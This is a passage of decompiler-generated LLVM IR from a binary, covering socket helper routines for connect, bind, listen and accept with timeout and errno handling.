  br i1 %v2_407210, label %dec_label_pc_407274, label %dec_label_pc_4072c4

dec_label_pc_407220:                              ; preds = %dec_label_pc_4071fc
  store i32 %v3_407220, i32* %v0.global-to-local, align 4
  %v4_407234 = call i32 @function_407e04(i32 %v3_407220, i8 1, i32 %tmp)
  %v1_407240 = urem i32 %v4_407234, 256
  %v1_407244 = xor i32 %v1_407240, 1
  store i32 %v1_407244, i32* %v0.global-to-local, align 4
  %v1_407248 = icmp eq i32 %v1_407244, 0
  br i1 %v1_407248, label %dec_label_pc_4072c4, label %dec_label_pc_40724c

dec_label_pc_40724c:                              ; preds = %dec_label_pc_407220
  %v2_407250 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_407250, i32* %v0.global-to-local, align 4
  %v2_407258 = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-32)
  store i32 %v2_407258, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4072c4

dec_label_pc_407274:                              ; preds = %dec_label_pc_407208
  store i32 %v3_407220, i32* %v0.global-to-local, align 4
  %v4_407288 = call i32 @function_407e04(i32 %v3_407220, i8 1, i32 %tmp)
  %v1_407294 = urem i32 %v4_407288, 256
  %v1_407298 = xor i32 %v1_407294, 1
  store i32 %v1_407298, i32* %v0.global-to-local, align 4
  %v1_40729c = icmp eq i32 %v1_407298, 0
  br i1 %v1_40729c, label %dec_label_pc_4072c4, label %dec_label_pc_4072a0

dec_label_pc_4072a0:                              ; preds = %dec_label_pc_407274
  %v2_4072a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_4072a4, i32* %v0.global-to-local, align 4
  %v2_4072ac = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-32)
  store i32 %v2_4072ac, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4072c4

dec_label_pc_4072c4:                              ; preds = %dec_label_pc_4072a0, %dec_label_pc_407274, %dec_label_pc_407220, %dec_label_pc_407208, %dec_label_pc_40724c
  %v3_4072c4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_4072c4, i32* %v0.global-to-local, align 4
  %v1_4072cc = icmp sgt i32 %v3_4072c4, -1
  br i1 %v1_4072cc, label %dec_label_pc_4072dc, label %dec_label_pc_407354

dec_label_pc_4072dc:                              ; preds = %dec_label_pc_4072c4
  %v4_4072dc = zext i8 %stack_var_-48.0 to i32
  store i32 %v4_4072dc, i32* %v0.global-to-local, align 4
  %v1_4072e4 = icmp eq i8 %stack_var_-48.0, 0
  br i1 %v1_4072e4, label %dec_label_pc_407354, label %dec_label_pc_4072e8

dec_label_pc_4072e8:                              ; preds = %dec_label_pc_4072dc
  %v2_4072ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_4072ec, i32* %v0.global-to-local, align 4
  %v1_4072f4 = bitcast i32* %stack_var_-28 to i8*
  %v2_4072f4 = call i32 @function_409bfc(i8* %v1_4072f4)
  %v1_407300 = urem i32 %v2_4072f4, 256
  %v1_407304 = xor i32 %v1_407300, 1
  store i32 %v1_407304, i32* %v0.global-to-local, align 4
  %v1_407308 = icmp eq i32 %v1_407304, 0
  br i1 %v1_407308, label %dec_label_pc_40730c, label %dec_label_pc_407340

dec_label_pc_40730c:                              ; preds = %dec_label_pc_4072e8
  %v3_407310 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_4072ec, i32* %v0.global-to-local, align 4
  %v4_407324 = call i32 @function_408554(i32 %v3_407310, i8* %v1_4072f4, i32 %tmp)
  %v1_407330 = urem i32 %v4_407324, 256
  %v1_407334 = xor i32 %v1_407330, 1
  store i32 %v1_407334, i32* %v0.global-to-local, align 4
  %v1_407338 = icmp eq i32 %v1_407334, 0
  br i1 %v1_407338, label %dec_label_pc_407354, label %dec_label_pc_407340

dec_label_pc_407340:                              ; preds = %dec_label_pc_40730c, %dec_label_pc_4072e8
  %v2_407340 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_407340, i32* %v0.global-to-local, align 4
  %v2_407348 = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-32)
  store i32 %v2_407348, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407354

dec_label_pc_407354:                              ; preds = %dec_label_pc_4072c4, %dec_label_pc_4071b0, %dec_label_pc_4072dc, %dec_label_pc_40730c, %dec_label_pc_4071c0, %dec_label_pc_407340
  %v3_407354 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_407354, i32* %v0.global-to-local, align 4
  ret i32 %v3_407354

; uselistorder directives
  uselistorder i32 %v1_407334, { 1, 0 }
  uselistorder i32 %v1_407304, { 1, 0 }
  uselistorder i32 %v1_407298, { 1, 0 }
  uselistorder i32 %v1_407244, { 1, 0 }
  uselistorder i8 %stack_var_-48.0, { 1, 0 }
  uselistorder i32 %v3_407220, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %stack_var_-32, { 3, 2, 14, 4, 5, 1, 15, 0, 16, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %tmp, { 3, 2, 4, 0, 1 }
  uselistorder i32* %v0.global-to-local, { 31, 34, 32, 33, 35, 36, 37, 0, 1, 4, 2, 3, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 17, 16, 19, 18, 21, 20, 24, 22, 23, 25, 26, 27, 30, 28, 29 }
  uselistorder i32 (i32, i32, i32)* @socket, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 255, { 2, 0, 1 }
  uselistorder i32 %arg1, { 0, 1, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_407354, { 5, 3, 2, 0, 4, 1 }
  uselistorder label %dec_label_pc_4072c4, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_4071a4, { 6, 0, 1, 2, 3, 4, 5 }
}

define i32 @sock_connect(i32 %arg1, i16 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0.global-to-local = alloca i32, align 4
  %tmp = sext i16 %arg2 to i32
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_407370 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_407370, i32* @fp, align 4
  store i32 %tmp, i32* %v0.global-to-local, align 4
  %v2_4073a8 = inttoptr i32 %arg5 to i32*
  %v3_4073a8 = call i32 @sock_open(i32 6, i32* %v2_4073a8)
  store i32 %v3_4073a8, i32* %stack_var_-28, align 4
  store i32 %v3_4073a8, i32* %v0.global-to-local, align 4
  %v1_4073c0 = icmp slt i32 %v3_4073a8, 0
  br i1 %v1_4073c0, label %dec_label_pc_40775c, label %dec_label_pc_4073c4

dec_label_pc_4073c4:                              ; preds = %entry
  %v2_4073d0 = ptrtoint i32* %stack_var_-24 to i32
  %v3_4073e0 = load i32, i32* @global_var_41b220.22, align 4
  store i32 %v3_4073e0, i32* %v0.global-to-local, align 4
  %v5_4073ec = call i32* @memset(i32* nonnull %stack_var_-24, i32 0, i32 16)
  store i32 2, i32* %stack_var_-24, align 4
  store i32 %arg3, i32* %v0.global-to-local, align 4
  %v1_40749c = icmp eq i32 %arg3, 0
  br i1 %v1_40749c, label %dec_label_pc_407568, label %dec_label_pc_4074a0

dec_label_pc_4074a0:                              ; preds = %dec_label_pc_4073c4
  %v1_4074c8 = mul i32 %arg3, 1000
  store i32 %v1_4074c8, i32* %v0.global-to-local, align 4
  %v4_4074d8 = call i32 @sock_set_timeo_rx(i32 %v3_4073a8, i32 %v1_4074c8, i32* null)
  store i32 %v4_4074d8, i32* %v0.global-to-local, align 4
  %v1_4074e4 = icmp eq i32 %v4_4074d8, 0
  br i1 %v1_4074e4, label %dec_label_pc_407538, label %dec_label_pc_4074e8

dec_label_pc_4074e8:                              ; preds = %dec_label_pc_4074a0
  %v3_4074ec = load i32, i32* %stack_var_-28, align 4
  store i32 %v1_4074c8, i32* %v0.global-to-local, align 4
  %v4_407520 = call i32 @sock_set_timeo_tx(i32 %v3_4074ec, i32 %v1_4074c8, i32* null)
  store i32 %v4_407520, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407538

dec_label_pc_407538:                              ; preds = %dec_label_pc_4074e8, %dec_label_pc_4074a0
  %v3_40753c = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_40753c, i32* %v0.global-to-local, align 4
  %v3_407548 = call i32 @time(i32* null)
  %v2_407560 = add i32 %v3_407548, %arg3
  store i32 %v2_407560, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407568

dec_label_pc_407568:                              ; preds = %dec_label_pc_4073c4, %dec_label_pc_407538
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_4073c4 ], [ %v2_407560, %dec_label_pc_407538 ]
  %v1_407570 = icmp sgt i32 %arg4, -1
  %arg4. = select i1 %v1_407570, i32 %arg4, i32 2147483647
  br label %dec_label_pc_4076a4.outer.outer

dec_label_pc_4076a4.outer.outer:                  ; preds = %dec_label_pc_407694, %dec_label_pc_407568
  %stack_var_-44.2.ph.ph = phi i32 [ %stack_var_-44.0, %dec_label_pc_407568 ], [ %stack_var_-44.1, %dec_label_pc_407694 ]
  %stack_var_-48.0.ph.ph = phi i8 [ 0, %dec_label_pc_407568 ], [ %v1_4075c4, %dec_label_pc_407694 ]
  %stack_var_12.0.ph.ph = phi i32 [ %arg4., %dec_label_pc_407568 ], [ %v1_40769c, %dec_label_pc_407694 ]
  store i32 %stack_var_12.0.ph.ph, i32* %v0.global-to-local, align 4
  %v1_4076ac = icmp eq i32 %stack_var_12.0.ph.ph, 0
  br label %dec_label_pc_4076a4.outer

dec_label_pc_407594:                              ; preds = %dec_label_pc_4076b0
  store i32 %v2_4073d0, i32* %v0.global-to-local, align 4
  %v3_4075a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32272) to i32*), align 4
  store i32 %v3_4075a8, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4075a8)
  %v0_4075c0 = load i32, i32* %v0.global-to-local, align 4
  %v1_4075c0 = icmp eq i32 %v0_4075c0, 0
  %v2_4075c0 = zext i1 %v1_4075c0 to i32
  %v1_4075c4 = zext i1 %v1_4075c0 to i8
  %v1_4075d0 = xor i32 %v2_4075c0, 1
  store i32 %v1_4075d0, i32* %v0.global-to-local, align 4
  %v1_4075d8 = icmp eq i32 %v1_4075d0, 0
  br i1 %v1_4075d8, label %dec_label_pc_407654, label %dec_label_pc_4075dc

dec_label_pc_4075dc:                              ; preds = %dec_label_pc_407594
  %v3_4075e0 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_4075e0, i32* %v0.global-to-local, align 4
  %v1_4075ec = call i32* @__errno_location()
  %v3_4075ec = ptrtoint i32* %v1_4075ec to i32
  store i32 %v3_4075ec, i32* %v0.global-to-local, align 4
  %v2_4075f8 = load i32, i32* %v1_4075ec, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_407600 = icmp eq i32 %v2_4075f8, 4
  br i1 %v2_407600, label %dec_label_pc_407604, label %dec_label_pc_407654

dec_label_pc_407604:                              ; preds = %dec_label_pc_4075dc
  store i32 %stack_var_-44.2.ph, i32* %v0.global-to-local, align 4
  br i1 %v1_407610, label %dec_label_pc_4076a4.outer, label %dec_label_pc_407614

dec_label_pc_407614:                              ; preds = %dec_label_pc_407604
  %v3_40761c = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_40761c, i32* %v0.global-to-local, align 4
  %v3_407628 = call i32 @time(i32* null)
  %v2_407640 = icmp slt i32 %stack_var_-44.2.ph, %v3_407628
  %v3_407640 = zext i1 %v2_407640 to i32
  store i32 %v3_407640, i32* %v0.global-to-local, align 4
  br i1 %v2_407640, label %dec_label_pc_407654.thread, label %dec_label_pc_4076a4

dec_label_pc_407654.thread:                       ; preds = %dec_label_pc_407614
  store i32 %stack_var_-44.2.ph, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407660

dec_label_pc_407654:                              ; preds = %dec_label_pc_4075dc, %dec_label_pc_407594
  store i32 %stack_var_-44.2.ph, i32* %v0.global-to-local, align 4
  br i1 %v1_407610, label %dec_label_pc_407694, label %dec_label_pc_407660

dec_label_pc_407660:                              ; preds = %dec_label_pc_407654.thread, %dec_label_pc_407654
  %v3_407668 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32476) to i32*), align 4
  store i32 %v3_407668, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407668)
  %v0_407680 = load i32, i32* %v0.global-to-local, align 4
  %v2_40768c = add i32 %v0_407680, %arg3
  store i32 %v2_40768c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407694

dec_label_pc_407694:                              ; preds = %dec_label_pc_407654, %dec_label_pc_407660
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_407654 ], [ %v2_40768c, %dec_label_pc_407660 ]
  %v1_40769c = add i32 %stack_var_12.0.ph.ph, -1
  br label %dec_label_pc_4076a4.outer.outer

dec_label_pc_4076a4.outer:                        ; preds = %dec_label_pc_407604, %dec_label_pc_4076a4.outer.outer
  %stack_var_-44.2.ph = phi i32 [ %stack_var_-44.2.ph.ph, %dec_label_pc_4076a4.outer.outer ], [ 0, %dec_label_pc_407604 ]
  %stack_var_-48.0.ph = phi i8 [ %stack_var_-48.0.ph.ph, %dec_label_pc_4076a4.outer.outer ], [ %v1_4075c4, %dec_label_pc_407604 ]
  %v1_407610 = icmp eq i32 %stack_var_-44.2.ph, 0
  br label %dec_label_pc_4076a4

dec_label_pc_4076a4:                              ; preds = %dec_label_pc_4076a4.outer, %dec_label_pc_407614
  %stack_var_-48.0 = phi i8 [ %v1_4075c4, %dec_label_pc_407614 ], [ %stack_var_-48.0.ph, %dec_label_pc_4076a4.outer ]
  store i32 %stack_var_12.0.ph.ph, i32* %v0.global-to-local, align 4
  br i1 %v1_4076ac, label %dec_label_pc_4076cc, label %dec_label_pc_4076b0

dec_label_pc_4076b0:                              ; preds = %dec_label_pc_4076a4
  %v4_4076b4 = zext i8 %stack_var_-48.0 to i32
  %v1_4076bc = xor i32 %v4_4076b4, 1
  store i32 %v1_4076bc, i32* %v0.global-to-local, align 4
  %v1_4076c4 = icmp eq i32 %v1_4076bc, 0
  br i1 %v1_4076c4, label %dec_label_pc_4076cc, label %dec_label_pc_407594

dec_label_pc_4076cc:                              ; preds = %dec_label_pc_4076b0, %dec_label_pc_4076a4
  %stack_var_-48.0.lcssa = phi i8 [ %stack_var_-48.0, %dec_label_pc_4076b0 ], [ %stack_var_-48.0.ph, %dec_label_pc_4076a4 ]
  %v4_4076cc = zext i8 %stack_var_-48.0.lcssa to i32
  %v1_4076d4 = xor i32 %v4_4076cc, 1
  store i32 %v1_4076d4, i32* %v0.global-to-local, align 4
  %v1_4076dc = icmp eq i32 %v1_4076d4, 0
  br i1 %v1_4076dc, label %dec_label_pc_40775c, label %dec_label_pc_4076e0

dec_label_pc_4076e0:                              ; preds = %dec_label_pc_4076cc
  %v2_4076e4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_4076e4, i32* %v0.global-to-local, align 4
  %v2_4076ec = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-28)
  %v3_4076fc = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_4076fc, i32* %v0.global-to-local, align 4
  %v1_407708 = call i32* @__errno_location()
  %v3_407708 = ptrtoint i32* %v1_407708 to i32
  store i32 %v3_407708, i32* %v0.global-to-local, align 4
  %v2_407714 = load i32, i32* %v1_407708, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_40771c = icmp eq i32 %v2_407714, 4
  br i1 %v2_40771c, label %dec_label_pc_40775c, label %dec_label_pc_407720

dec_label_pc_407720:                              ; preds = %dec_label_pc_4076e0
  store i32 %arg5, i32* %v0.global-to-local, align 4
  %v1_40772c = icmp eq i32 %arg5, 0
  br i1 %v1_40772c, label %dec_label_pc_40775c, label %dec_label_pc_407730

dec_label_pc_407730:                              ; preds = %dec_label_pc_407720
  %v3_407734 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_407734, i32* %v0.global-to-local, align 4
  %v1_407740 = call i32* @__errno_location()
  %v3_407740 = ptrtoint i32* %v1_407740 to i32
  store i32 %v3_407740, i32* %v0.global-to-local, align 4
  %v2_40774c = load i32, i32* %v1_407740, align 4
  store i32 %arg5, i32* %v0.global-to-local, align 4
  store i32 %v2_40774c, i32* %v2_4073a8, align 4
  br label %dec_label_pc_40775c

dec_label_pc_40775c:                              ; preds = %dec_label_pc_407720, %dec_label_pc_4076e0, %dec_label_pc_4076cc, %entry, %dec_label_pc_407730
  %v3_40775c = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_40775c, i32* %v0.global-to-local, align 4
  ret i32 %v3_40775c

; uselistorder directives
  uselistorder i1 %v1_407610, { 1, 0 }
  uselistorder i32 %stack_var_-44.2.ph, { 2, 3, 4, 1, 0 }
  uselistorder i8 %v1_4075c4, { 2, 0, 1 }
  uselistorder i32 %stack_var_12.0.ph.ph, { 2, 1, 3, 0 }
  uselistorder i32 %v1_4074c8, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0, 4, 2, 3 }
  uselistorder i32* %v0.global-to-local, { 2, 3, 7, 4, 5, 6, 11, 8, 9, 10, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 21, 28, 22, 23, 24, 25, 26, 1, 27, 29, 31, 30, 36, 32, 33, 34, 35, 37 }
  uselistorder i32 %arg5, { 3, 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_40775c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_407694, { 1, 0 }
  uselistorder label %dec_label_pc_407660, { 1, 0 }
  uselistorder label %dec_label_pc_407568, { 1, 0 }
}

define i32 @sock_bind(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_407778 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_407778, i32* @fp, align 4
  %v2_4077b0 = inttoptr i32 %arg4 to i32*
  %v3_4077b0 = call i32 @sock_open(i32 %arg1, i32* %v2_4077b0)
  store i32 %v3_4077b0, i32* %stack_var_-28, align 4
  %v1_4077c8 = icmp slt i32 %v3_4077b0, 0
  br i1 %v1_4077c8, label %dec_label_pc_407914, label %dec_label_pc_4077cc

dec_label_pc_4077cc:                              ; preds = %entry
  %v5_4077ec = call i32* @memset(i32* nonnull %stack_var_-24, i32 0, i32 16)
  store i32 2, i32* %stack_var_-24, align 4
  %tmp17 = bitcast i32* %stack_var_-24 to %sockaddr*
  %v6_4078b4 = call i32 @bind(i32 %v3_4077b0, %sockaddr* %tmp17, i32 16)
  %v1_4078c0 = icmp eq i32 %v6_4078b4, 0
  br i1 %v1_4078c0, label %dec_label_pc_407914, label %dec_label_pc_4078c4

dec_label_pc_4078c4:                              ; preds = %dec_label_pc_4077cc
  %v2_4078d0 = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-28)
  %v1_4078e4 = icmp eq i32 %arg4, 0
  br i1 %v1_4078e4, label %dec_label_pc_407914, label %dec_label_pc_4078e8

dec_label_pc_4078e8:                              ; preds = %dec_label_pc_4078c4
  %v1_4078f8 = call i32* @__errno_location()
  %v2_407904 = load i32, i32* %v1_4078f8, align 4
  store i32 %v2_407904, i32* %v2_4077b0, align 4
  br label %dec_label_pc_407914

dec_label_pc_407914:                              ; preds = %dec_label_pc_4078c4, %dec_label_pc_4077cc, %entry, %dec_label_pc_4078e8
  %v3_407914 = load i32, i32* %stack_var_-28, align 4
  ret i32 %v3_407914

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 2, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_407914, { 3, 0, 1, 2 }
}

define i32 @function_407930(i32 %arg1, i16 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407930:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v2_407930 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_407930, i32* @fp, align 4
  %v7_407974 = call i32 @sock_bind(i32 6, i32 %arg1, i16 %arg2, i32 %arg4, i32 ptrtoint (i32* @global_var_4230f0.1 to i32))
  store i32 %v7_407974, i32* %stack_var_-16, align 4
  %v1_40798c = icmp slt i32 %v7_407974, 0
  br i1 %v1_40798c, label %dec_label_pc_407a10, label %dec_label_pc_407990

dec_label_pc_407990:                              ; preds = %dec_label_pc_407930
  %v3_4079b0 = call i32 @listen(i32 %v7_407974, i32 %arg3)
  %v1_4079bc = icmp eq i32 %v3_4079b0, 0
  br i1 %v1_4079bc, label %dec_label_pc_407a10, label %dec_label_pc_4079c0

dec_label_pc_4079c0:                              ; preds = %dec_label_pc_407990
  %v2_4079cc = call i32 @sock_close_and_invalidate(i32* nonnull %stack_var_-16)
  %v1_4079e0 = icmp eq i32 %arg4, 0
  br i1 %v1_4079e0, label %dec_label_pc_407a10, label %dec_label_pc_4079e4

dec_label_pc_4079e4:                              ; preds = %dec_label_pc_4079c0
  %v1_4079f4 = call i32* @__errno_location()
  %v2_407a00 = load i32, i32* %v1_4079f4, align 4
  %v2_407a0c = inttoptr i32 %arg4 to i32*
  store i32 %v2_407a00, i32* %v2_407a0c, align 4
  br label %dec_label_pc_407a10

dec_label_pc_407a10:                              ; preds = %dec_label_pc_4079c0, %dec_label_pc_407990, %dec_label_pc_407930, %dec_label_pc_4079e4
  %v3_407a10 = load i32, i32* %stack_var_-16, align 4
  ret i32 %v3_407a10

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_407a10, { 3, 0, 1, 2 }
}

define i32 @function_407a2c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407a2c:
  %v0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to i16*
  %tmp16 = call i16 @__decompiler_undefined_function_4()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_0, align 4
  %v1_407a68 = icmp ne i32* %arg2, null
  %v2_407a68 = zext i1 %v1_407a68 to i32
  store i32 0, i32* %stack_var_-12, align 4
  %v2_407a78 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_407a78, i32* %v0.global-to-local, align 4
  %v4_407a88 = call i32 @function_408108(i32 %arg1, i32* nonnull %stack_var_-12, i32 0)
  store i32 %v4_407a88, i32* %v0.global-to-local, align 4
  %v1_407a94 = icmp eq i32 %v4_407a88, 0
  br i1 %v1_407a94, label %dec_label_pc_407afc.preheader, label %dec_label_pc_407a98

dec_label_pc_407a98:                              ; preds = %dec_label_pc_407a2c
  %v3_407a9c = load i32, i32* %stack_var_-12, align 4
  %v4_407aa4 = udiv i32 %v3_407a9c, 1000
  store i32 %v4_407aa4, i32* %stack_var_-12, align 4
  store i32 %v4_407aa4, i32* %v0.global-to-local, align 4
  %tmp34 = icmp ult i32 %v3_407a9c, 1000
  br i1 %tmp34, label %dec_label_pc_407afc.preheader, label %dec_label_pc_407ac8

dec_label_pc_407ac8:                              ; preds = %dec_label_pc_407a98
  %v3_407ad0 = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_407ad0, i32* %v0.global-to-local, align 4
  %v3_407adc = call i32 @time(i32* null)
  %v3_407aec = load i32, i32* %stack_var_-12, align 4
  %v2_407af4 = add i32 %v3_407aec, %v3_407adc
  store i32 %v2_407af4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407afc.preheader

dec_label_pc_407afc.preheader:                    ; preds = %dec_label_pc_407ac8, %dec_label_pc_407a2c, %dec_label_pc_407a98
  %stack_var_-52.0.ph = phi i32 [ %v2_407af4, %dec_label_pc_407ac8 ], [ 0, %dec_label_pc_407a98 ], [ 0, %dec_label_pc_407a2c ]
  %v1_407b04 = icmp eq i1 %v1_407a68, false
  %v2_407b0c = ptrtoint i32* %stack_var_-32 to i32
  %tmp35 = bitcast i32* %stack_var_-32 to %sockaddr*
  br label %dec_label_pc_407afc.outer

dec_label_pc_407afc.outer:                        ; preds = %dec_label_pc_407c8c, %dec_label_pc_407afc.preheader
  %stack_var_-52.0.ph7 = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_407afc.preheader ], [ 0, %dec_label_pc_407c8c ]
  %v1_407c98 = icmp eq i32 %stack_var_-52.0.ph7, 0
  br label %dec_label_pc_407afc

dec_label_pc_407afc:                              ; preds = %dec_label_pc_407afc.outer, %dec_label_pc_407c9c
  store i32 %v2_407a68, i32* %v0.global-to-local, align 4
  br i1 %v1_407b04, label %dec_label_pc_407c58, label %dec_label_pc_407b08

dec_label_pc_407b08:                              ; preds = %dec_label_pc_407afc
  store i32 %v2_407b0c, i32* %v0.global-to-local, align 4
  %v3_407b1c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32464) to i32*), align 4
  store i32 %v3_407b1c, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407b1c)
  store i32 16, i32* %stack_var_-16, align 4
  %v3_407b44 = load i32, i32* %stack_var_0, align 4
  %v3_407b50 = load i32, i32* @global_var_41b290.167, align 4
  store i32 %v3_407b50, i32* %v0.global-to-local, align 4
  %v7_407b5c = call i32 @accept(i32 %v3_407b44, %sockaddr* %tmp35, i32* nonnull %stack_var_-16)
  store i32 %v7_407b5c, i32* %v0.global-to-local, align 4
  %v1_407b74 = icmp slt i32 %v7_407b5c, 0
  br i1 %v1_407b74, label %dec_label_pc_407c58.thread4, label %dec_label_pc_407b78

dec_label_pc_407c58.thread4:                      ; preds = %dec_label_pc_407b08
  store i32 %v7_407b5c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407c64

dec_label_pc_407b78:                              ; preds = %dec_label_pc_407b08
  %v2_407bc8 = call i32 @llvm.bswap.i32(i32 %tmp19)
  store i32 %v2_407bc8, i32* %arg2, align 4
  store i32 %arg3, i32* %v0.global-to-local, align 4
  %v1_407be8 = icmp eq i32 %arg3, 0
  br i1 %v1_407be8, label %dec_label_pc_407c58.thread, label %dec_label_pc_407bec

dec_label_pc_407bec:                              ; preds = %dec_label_pc_407b78
  %div = udiv i16 %tmp16, 256
  %v1_407c0c = mul i16 %tmp16, 256
  %v2_407c10 = or i16 %v1_407c0c, %div
  store i32 %arg3, i32* %v0.global-to-local, align 4
  store i16 %v2_407c10, i16* %tmp, align 2
  br label %dec_label_pc_407c58.thread

dec_label_pc_407c58.thread:                       ; preds = %dec_label_pc_407b78, %dec_label_pc_407bec
  store i32 %v7_407b5c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_407d14

dec_label_pc_407c58:                              ; preds = %dec_label_pc_407afc
  %v3_407c3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_4230f0.1 to i32), i32 -32352) to i32*), align 4
  store i32 %v3_407c3c, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_407c3c)
  %v0_407c54 = load i32, i32* %v0.global-to-local, align 4
  %v1_407c60 = icmp sgt i32 %v0_407c54, -1
  br i1 %v1_407c60, label %dec_label_pc_407d14, label %dec_label_pc_407c64

dec_label_pc_407c64:                              ; preds = %dec_label_pc_407c58.thread4, %dec_label_pc_407c58
  %stack_var_-56.06 = phi i32 [ %v7_407b5c, %dec_label_pc_407c58.thread4 ], [ %v0_407c54, %dec_label_pc_407c58 ]
  %v3_407c68 = load i32, i32* @global_var_41b1f4.163, align 4
  store i32 %v3_407c68, i32* %v0.global-to-local, align 4
  %v1_407c74 = call i32* @__errno_location()
  %v3_407c74 = ptrtoint i32* %v1_407c74 to i32
  store i32 %v3_407c74, i32* %v0.global-to-local, align 4
  %v2_407c80 = load i32, i32* %v1_407c74, align 4
  store i32 4, i32* %v0.global-to-local, align 4
  %v2_407c88 = icmp eq i32 %v2_407c80, 4
  br i1 %v2_407c88, label %dec_label_pc_407c8c, label %dec_label_pc_407cdc

dec_label_pc_407c8c:                              ; preds = %dec_label_pc_407c64
  store i32 %stack_var_-52.0.ph7, i32* %v0.global-to-local, align 4
  br i1 %v1_407c98, label %dec_label_pc_407afc.outer, label %dec_label_pc_407c9c

dec_label_pc_407c9c:                              ; preds = %dec_label_pc_407c8c
  %v3_407ca4 = load i32, i32* @global_var_41b214.76, align 4
  store i32 %v3_407ca4, i32* %v0.global-to-local, align 4
  %v3_407cb0 = call i32 @time(i32* null)
  %v2_407cc8 = icmp slt i32 %stack_var_-52.0.ph7, %v3_407cb0
  %v3_407cc8 = zext i1 %v2_407cc8 to i32
  store i32 %v3_407cc8, i32* %v0.global-to-local, align 4
  %v1_407ccc = icmp eq i1 %v2_407cc8, false
  br i1 %v1_407ccc, label %dec_label_pc_407afc, label %dec_label_pc_407d14

dec_label_pc_407cdc:                              ; preds = %dec_label_pc_407c64
  store i32 %arg4, i32* %v0.global-to-local, align 4
  %v1_407ce4 = icmp eq i32 %arg4, 0
  br i1 %v1_407ce4, label %dec_label_pc_407d14, label %dec_label_pc_407ce8

dec_label_pc_407ce8:                              ; preds = %dec_label_pc_407cdc
  %v3_407cec = load i32, i32* @global_var_41b1f4.163, align 4
